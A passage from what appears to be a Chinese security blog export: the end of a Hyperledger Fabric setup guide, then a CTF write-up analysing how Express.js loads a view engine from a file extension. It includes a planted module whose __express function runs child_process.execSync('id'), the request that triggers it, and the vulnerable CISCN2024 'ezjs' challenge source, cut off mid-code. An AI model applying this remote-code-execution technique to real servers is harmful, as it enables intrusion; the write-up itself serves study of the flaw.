<h2 id="设置go代理"><a href="#设置go代理" class="headerlink" title="设置go代理"></a>设置go代理</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">go env -w GO111MODULE=on</span><br><span class="line">go env -w GOPROXY=https://goproxy.cn,direct</span><br></pre></td></tr></table></figure>

<p>测试一下，使用自带的<code>test-network</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./network.sh up</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE-fabric%E6%90%AD%E5%BB%BA/image-20240529225517680.png"></p>
<p>没问题的话使用<code>./network.sh down</code>关闭即可</p>
<h2 id="启动Fabric"><a href="#启动Fabric" class="headerlink" title="启动Fabric"></a>启动Fabric</h2><p>启动一下fabric</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd fabcar</span><br><span class="line">./startFabric.sh</span><br></pre></td></tr></table></figure>



<h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd fabcar/go</span><br><span class="line">go build -mod=mod #构建Go程序并且导入依赖包</span><br><span class="line">go run fabcar.go</span><br></pre></td></tr></table></figure>

<p>测试成功</p>
<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE-fabric%E6%90%AD%E5%BB%BA/image-20240529233205539.png"></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://mp.weixin.qq.com/s?__biz=Mzk0ODcwNTk4Mw==&mid=2247483706&idx=1&sn=c45a5c625966451859477307002ff859&chksm=c362ceeaf41547fce0a9e9008b1cbb095de2f19aa26856516150aefe969dcb16b28d35940bdc&mpshare=1&scene=23&srcid=0529j1qA3JxQ5rtvRugYrNq9&sharer_shareinfo=ee79a1ea9ef63d9bc3802817b585ee12&sharer_shareinfo_first=ee79a1ea9ef63d9bc3802817b585ee12#rd">https://mp.weixin.qq.com/s?__biz=Mzk0ODcwNTk4Mw==&amp;mid=2247483706&amp;idx=1&amp;sn=c45a5c625966451859477307002ff859&amp;chksm=c362ceeaf41547fce0a9e9008b1cbb095de2f19aa26856516150aefe969dcb16b28d35940bdc&amp;mpshare=1&amp;scene=23&amp;srcid=0529j1qA3JxQ5rtvRugYrNq9&amp;sharer_shareinfo=ee79a1ea9ef63d9bc3802817b585ee12&amp;sharer_shareinfo_first=ee79a1ea9ef63d9bc3802817b585ee12#rd</a></p>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>环境搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>分析Express engine处理引擎的trick</title>
    <url>/article/%E5%88%86%E6%9E%90Express-engine%E5%A4%84%E7%90%86%E5%BC%95%E6%93%8E%E7%9A%84trick.html</url>
    <content><![CDATA[<p>CISCN2024国决一道题的知识点，感觉还挺有意思</p>
<span id="more"></span>

<h1 id="分析Express-engine处理引擎的trick"><a href="#分析Express-engine处理引擎的trick" class="headerlink" title="分析Express engine处理引擎的trick"></a>分析Express engine处理引擎的trick</h1><h2 id="流程链简析"><a href="#流程链简析" class="headerlink" title="流程链简析"></a>流程链简析</h2><p>当用express的解析模板引擎的时候，即使默认使用了ejs，但是也会有引擎修改的工程</p>
<p>大概调用链如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">render() -&gt; View() -&gt; tryRender() -&gt; this.engine()</span><br></pre></td></tr></table></figure>

<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>位置：<code>node_modules\express\lib\application.js</code></p>
<p>从<code>render()</code>函数开始分析</p>
<p><img src="/article/%E5%88%86%E6%9E%90Express-engine%E5%A4%84%E7%90%86%E5%BC%95%E6%93%8E%E7%9A%84trick/image-20240729115446408.png"></p>
<p>接收参数<code>name,options,callback</code>，具体指</p>
<ul>
<li><code>name</code>: 视图文件的名称。</li>
<li><code>options</code>: 渲染选项，可以包含局部变量等。</li>
<li><code>callback</code>: 可选的回调函数，通常用于处理渲染后的结果。</li>
</ul>
<p>如果第二个参数是函数，则将其视为回调，并将<code>options</code>设置为空对象</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> options === <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">  done = options;</span><br><span class="line">  opts = &#123;&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>往下看，如果<code>renderOptions.cache</code>为空，调用<code>enabled()</code>函数判断是否开启<code>view cache</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (renderOptions.<span class="property">cache</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">  renderOptions.<span class="property">cache</span> = <span class="variable language_">this</span>.<span class="title function_">enabled</span>(<span class="string">&#x27;view cache&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关键代码在下面，由于view在没cache的情况下view变量默认是空的，所以继续调用<code>View()</code>函数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!view) &#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="title class_">View</span> = <span class="variable language_">this</span>.<span class="title function_">get</span>(<span class="string">&#x27;view&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  view = <span class="keyword">new</span> <span class="title class_">View</span>(name, &#123;</span><br><span class="line">    <span class="attr">defaultEngine</span>: <span class="variable language_">this</span>.<span class="title function_">get</span>(<span class="string">&#x27;view engine&#x27;</span>),</span><br><span class="line">    <span class="attr">root</span>: <span class="variable language_">this</span>.<span class="title function_">get</span>(<span class="string">&#x27;views&#x27;</span>),</span><br><span class="line">    <span class="attr">engines</span>: engines</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<p>跟进一下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">View</span>(<span class="params">name, options</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> opts = options || &#123;&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">defaultEngine</span> = opts.<span class="property">defaultEngine</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">ext</span> = <span class="title function_">extname</span>(name);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">root</span> = opts.<span class="property">root</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">ext</span> &amp;&amp; !<span class="variable language_">this</span>.<span class="property">defaultEngine</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;No default engine was specified and no extension was provided.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> fileName = name;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">ext</span>) &#123;</span><br><span class="line">    <span class="comment">// get extension from default engine name</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">ext</span> = <span class="variable language_">this</span>.<span class="property">defaultEngine</span>[<span class="number">0</span>] !== <span class="string">&#x27;.&#x27;</span></span><br><span class="line">      ? <span class="string">&#x27;.&#x27;</span> + <span class="variable language_">this</span>.<span class="property">defaultEngine</span></span><br><span class="line">      : <span class="variable language_">this</span>.<span class="property">defaultEngine</span>;</span><br><span class="line"></span><br><span class="line">    fileName += <span class="variable language_">this</span>.<span class="property">ext</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!opts.<span class="property">engines</span>[<span class="variable language_">this</span>.<span class="property">ext</span>]) &#123;</span><br><span class="line">    <span class="comment">// load engine</span></span><br><span class="line">    <span class="keyword">var</span> mod = <span class="variable language_">this</span>.<span class="property">ext</span>.<span class="title function_">slice</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="title function_">debug</span>(<span class="string">&#x27;require &quot;%s&quot;&#x27;</span>, mod)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// default engine export</span></span><br><span class="line">    <span class="keyword">var</span> fn = <span class="built_in">require</span>(mod).<span class="property">__express</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> fn !== <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Module &quot;&#x27;</span> + mod + <span class="string">&#x27;&quot; does not provide a view engine.&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    opts.<span class="property">engines</span>[<span class="variable language_">this</span>.<span class="property">ext</span>] = fn</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//省略部分代码   </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>重点看后面部分，如果<code>opts.engines[this.ext]</code>为空那么调用<code>require()</code>函数</p>
<p>在这里<code>__express()</code>函数被导入然后定义在<code>opts.engines[this.ext]</code>，也就是说现在engine里有<code>__express()</code>函数</p>
<p><img src="/article/%E5%88%86%E6%9E%90Express-engine%E5%A4%84%E7%90%86%E5%BC%95%E6%93%8E%E7%9A%84trick/image-20240729121555963.png"></p>
<p>通过搜索可以知道存在回调函数调用，那么我们就可以用来实现RCE</p>
<p>现在关键点在于<code>opts.engines[this.ext]</code>是否可控，我们跟进<code>extname()</code>函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var extname = path.extname;</span><br></pre></td></tr></table></figure>

<p>发现作用就是获取文件拓展名，如果存在类似文件上传那么<code>ext</code>就可控</p>
<p>我们回到<code>render()</code>函数，在第609行处调用<code>tryRender()</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">tryRender</span>(<span class="params">view, options, callback</span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    view.<span class="title function_">render</span>(options, callback);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    <span class="title function_">callback</span>(err);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续跟进一下<code>view.render()</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">View</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">render</span> = <span class="keyword">function</span> <span class="title function_">render</span>(<span class="params">options, callback</span>) &#123;</span><br><span class="line">  <span class="title function_">debug</span>(<span class="string">&#x27;render &quot;%s&quot;&#x27;</span>, <span class="variable language_">this</span>.<span class="property">path</span>);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">engine</span>(<span class="variable language_">this</span>.<span class="property">path</span>, options, callback);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>最后执行<code>this.engine(this.path, options, callback);</code></p>
<hr>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>先准备好对应版本的express和ejs</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install express@4.17.2</span><br><span class="line">npm install ejs@3.1.6</span><br></pre></td></tr></table></figure>

<p>我们本地编写demo验证一下，index.js内容如下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> ejs=<span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app=<span class="title function_">express</span>()</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> page = req.<span class="property">query</span>.<span class="property">filename</span></span><br><span class="line">    res.<span class="title function_">render</span>(page);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="string">&#x27;3000&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`http://localhost:3000`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>当对filename传参为不附加后缀的，他会默认使用我们的ejs解析，也就是说</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1/?filename=1</span><br><span class="line">127.0.0.1/?filename=1.ejs    //等价的</span><br></pre></td></tr></table></figure>

<p>当我们键入一个自定义后缀1.aaa时候，会像前文提到的这样处理aaa</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mod = <span class="variable language_">this</span>.<span class="property">ext</span>.<span class="title function_">slice</span>(<span class="number">1</span>)</span><br><span class="line"><span class="title function_">debug</span>(<span class="string">&#x27;require &quot;%s&quot;&#x27;</span>, mod)</span><br><span class="line"></span><br><span class="line"><span class="comment">// default engine export</span></span><br><span class="line"><span class="keyword">var</span> fn = <span class="built_in">require</span>(mod).<span class="property">__express</span></span><br></pre></td></tr></table></figure>

<p>如果我们有一个文件上传位点可控，并且能把文件传到<code>node_modules</code>下，其实就可以进行<code>__express()</code>函数的使用</p>
<p>这里我们直接在本地<code>node_modules</code>下建立一个aaa文件夹，添加一个index.js内容如下</p>
<p>（模拟文件上传功能）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exports</span>.<span class="property">__express</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;id&quot;</span>).<span class="title function_">toString</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后键入任意文件名，后缀为aaa即可调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:3000/?filename=1.aaa</span><br></pre></td></tr></table></figure>

<p>我们可以debug调试看看，不过这里先修改下代码</p>
<p>位置在<code>node_modules\express\lib\application.js</code>第576行，因为默认<code>view.path</code>为空（实际情况不为空），所以等会调试的时候就会抛出异常，我们先把<code>view.path</code>前面的<code>!</code>去掉，等调试完再添加上去</p>
<p><img src="/article/%E5%88%86%E6%9E%90Express-engine%E5%A4%84%E7%90%86%E5%BC%95%E6%93%8E%E7%9A%84trick/image-20240729194321522.png"></p>
<p>准备好后，我们在<code>node_modules\express\lib\view.js</code>第91行下断点</p>
<p>传参<code>?filename=1.aaa</code>，可以发现engines内容是我们键入的代码</p>
<p><img src="/article/%E5%88%86%E6%9E%90Express-engine%E5%A4%84%E7%90%86%E5%BC%95%E6%93%8E%E7%9A%84trick/image-20240729194740273.png"></p>
<p>一步步调试到后面，虽然对照的default是ejs，但我们还是在engine里进行替换了我们要执行的函数</p>
<p><img src="/article/%E5%88%86%E6%9E%90Express-engine%E5%A4%84%E7%90%86%E5%BC%95%E6%93%8E%E7%9A%84trick/image-20240729194914407.png"></p>
<hr>
<h2 id="例题-CISCN2024国决-ezjs"><a href="#例题-CISCN2024国决-ezjs" class="headerlink" title="[例题]CISCN2024国决-ezjs"></a>[例题]CISCN2024国决-ezjs</h2><p>app.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> ejs=<span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParse = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">&#x27;multer&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createDirectoriesForFilePath</span>(<span class="params">filePath</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> dirname = path.<span class="title function_">dirname</span>(filePath);</span><br><span class="line"></span><br><span class="line">    fs.<span class="title function_">mkdirSync</span>(dirname, &#123; <span class="attr">recursive</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">IfLogin</span>(<span class="params">req, res, next</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span>!=<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title function_">next</span>()</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> storage = multer.<span class="title function_">diskStorage</span>(&#123;</span><br><span class="line">    <span class="attr">destination</span>: <span class="keyword">function</span> (<span class="params">req, file, cb</span>) &#123;</span><br><span class="line">        <span class="title function_">cb</span>(<span class="literal">null</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>)); <span class="comment">// 设置上传文件的目标目录</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">filename</span>: <span class="keyword">function</span> (<span class="params">req, file, cb</span>) &#123;</span><br><span class="line">        <span class="comment">// 直接使用原始文件名</span></span><br><span class="line">        <span class="title function_">cb</span>(<span class="literal">null</span>, file.<span class="property">originalname</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 配置 multer 上传中间件</span></span><br><span class="line"><span class="keyword">const</span> upload = <span class="title function_">multer</span>(&#123;</span><br><span class="line">    <span class="attr">storage</span>: storage, <span class="comment">// 使用自定义存储选项</span></span><br><span class="line">    <span class="attr">fileFilter</span>: <span class="function">(<span class="params">req, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> fileExt = path.<span class="title function_">extname</span>(file.<span class="property">originalname</span>).<span class="title function_">toLowerCase</span>();</span><br><span class="line">        <span class="keyword">if</span> (fileExt === <span class="string">&#x27;.ejs&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果文件后缀为 .ejs，则拒绝上传该文件</span></span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">cb</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Upload of .ejs files is not allowed&#x27;</span>), <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_">cb</span>(<span class="literal">null</span>, <span class="literal">true</span>); <span class="comment">// 允许上传其他类型的文件</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">admin=&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>:<span class="string">&quot;ADMIN&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="string">&quot;123456&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">app=<span class="title function_">express</span>()</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>)));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(bodyParse.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">false</span>&#125;));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">secret</span>: <span class="string">&#x27;Can_U_hack_me?&#x27;</span>,</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">cookie</span>: &#123; <span class="attr">maxAge</span>: <span class="number">3600</span> * <span class="number">1000</span> &#125;</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; username, password &#125; = req.<span class="property">body</span>;</span><br><span class="line">    <span class="keyword">if</span> (username === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;you can not be admin&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> new_username = username.<span class="title function_">toUpperCase</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (new_username === admin.<span class="property">username</span> &amp;&amp; password === admin.<span class="property">password</span>) &#123;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">user</span> = <span class="string">&quot;ADMIN&quot;</span>;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/rename&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// res.redirect(&#x27;/login&#x27;);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/upload&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;upload&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/upload&#x27;</span>, upload.<span class="title function_">single</span>(<span class="string">&#x27;fileInput&#x27;</span>), <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">file</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;No file uploaded&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> fileExt = path.<span class="title function_">extname</span>(req.<span class="property">file</span>.<span class="property">originalname</span>).<span class="title function_">toLowerCase</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fileExt === <span class="string">&#x27;.ejs&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Upload of .ejs files is not allowed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;File uploaded successfully: &#x27;</span> + req.<span class="property">file</span>.<span class="property">originalname</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/render&#x27;</span>,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; filename &#125; = req.<span class="property">query</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!filename) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Filename parameter is required&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> filePath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, filename);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (filePath.<span class="title function_">endsWith</span>(<span class="string">&#x27;.ejs&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid file type.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">render</span>(filePath);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/rename&#x27;</span>,<span class="title class_">IfLogin</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span> !== <span class="string">&#x27;ADMIN&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Access forbidden&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> &#123; oldPath , newPath &#125; = req.<span class="property">query</span>;</span><br><span class="line">    <span class="keyword">if</span> (!oldPath || !newPath) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Missing oldPath or newPath&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (newPath &amp;&amp; <span class="regexp">/app\.js|\\|\.ejs/i</span>.<span class="title function_">test</span>(newPath)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid file name&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (oldPath &amp;&amp; <span class="regexp">/\.\.|flag/i</span>.<span class="title function_">test</span>(oldPath)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid file name&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> new_file = newPath.<span class="title function_">toLowerCase</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> oldFilePath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, oldPath);</span><br><span class="line">    <span class="keyword">const</span> newFilePath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, new_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (newFilePath.<span class="title function_">endsWith</span>(<span class="string">&#x27;.ejs&#x27;</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid file type.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!oldPath) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;oldPath parameter is required&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(oldFilePath)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&#x27;Old file not found&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fs.<span class="title function_">existsSync</span>(newFilePath)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">409</span>).<span class="title function_">send</span>(<span class="string">&#x27;New file path already exists&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">createDirectoriesForFilePath</span>(newFilePath)</span><br><span class="line">    fs.<span class="title function_">rename</span>(oldFilePath, newFilePath, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error renaming file:&#x27;</span>, err);</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error renaming file&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res.<span class="title 